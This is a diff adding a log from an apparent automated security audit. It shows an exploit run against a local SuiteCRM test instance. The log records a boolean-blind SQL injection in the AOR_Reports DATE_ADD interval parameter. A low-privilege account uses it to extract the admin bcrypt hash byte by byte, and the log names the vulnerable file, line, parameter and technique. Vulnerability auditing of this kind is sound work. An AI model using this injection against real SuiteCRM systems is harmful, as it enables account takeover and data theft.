@@ -1,0 +1,34 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-016/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-016/../.venv
+========================================================================
+VULN-016: AOR_Reports DATE_ADD interval SQL injection -> full DB read
+target: http://localhost:33116
+========================================================================
+[INFO] sink: modules/AOR_Reports/AOR_Report.php:1722  DATE_ADD(...,INTERVAL + N <unit>)
+[INFO] injecting the interval-unit token via parameter_date_time[0] over changeReportPage
+[SETUP] admin logs in to create a disposable low-privilege user
+[SETUP] created low-priv user mod_e0cd0303 (RegularUser, is_admin=0)
+[SETUP] authenticated as the low-priv user (session cookie)
+[STEP] creating an AOR report we own, with a Date runtime-parameter condition
+[SETUP] report RID=548b623b-6e30-4f61-8cb7-56d3034cf86d  condition/param CID=8ed12ea8-92e0-4e81-b647-2ca3c02a3246
+[STEP] verifying the boolean oracle (injected 1=1 vs 1=2 must differ)
+[PROOF] injected TRUE  (1=1) -> report populated: True
+[PROOF] injected FALSE (1=2) -> report populated: False
+[OK] boolean-blind SQL injection confirmed: attacker boolean controls the WHERE clause
+[STEP] extracting 'admin' user_hash via boolean oracle (ORD/BETWEEN, byte-exact, no < >)
+[STEP]   byte  1 =  36 '$'   hash so far: '$'
+[STEP]   byte  2 =  50 '2'   hash so far: '$2'
+[STEP]   byte  3 = 121 'y'   hash so far: '$2y'
+[STEP]   byte  4 =  36 '$'   hash so far: '$2y$'
+[STEP]   byte  5 =  49 '1'   hash so far: '$2y$1'
+[STEP]   byte  6 =  48 '0'   hash so far: '$2y$10'
+[STEP]   byte  7 =  36 '$'   hash so far: '$2y$10$'
+[STEP]   byte 10 = 116 't'   hash so far: '$2y$10$Fxt'
+[STEP]   byte 20 = 100 'd'   hash so far: '$2y$10$Fxtha9NR3xJMd'
+[STEP]   byte 30 = 122 'z'   hash so far: '$2y$10$Fxtha9NR3xJMdYCmjiuJOOz'
+[STEP]   byte 40 =  46 '.'   hash so far: '$2y$10$Fxtha9NR3xJMdYCmjiuJOOz4VXvBGT82.'
+[STEP]   byte 50 =  84 'T'   hash so far: '$2y$10$Fxtha9NR3xJMdYCmjiuJOOz4VXvBGT82.iphvi5H8sT'
+[STEP]   byte 60 =  87 'W'   hash so far: '$2y$10$Fxtha9NR3xJMdYCmjiuJOOz4VXvBGT82.iphvi5H8sThFdZTYAC0W'
+[PROOF] exfiltrated admin.user_hash via SQLi = '$2y$10$Fxtha9NR3xJMdYCmjiuJOOz4VXvBGT82.iphvi5H8sThFdZTYAC0W'
+[OK] exploit confirmed — extracted a valid bcrypt hash for 'admin' (prefix '$2y$10$') via boolean SQL injection from a low-priv account
+==> VULN-016: CONFIRMED — low-priv boolean SQLi read admin.user_hash = $2y$10$Fxtha9NR3xJMdYCmjiuJOOz4VXvBGT82.iphvi5H8sThFdZTYAC0W
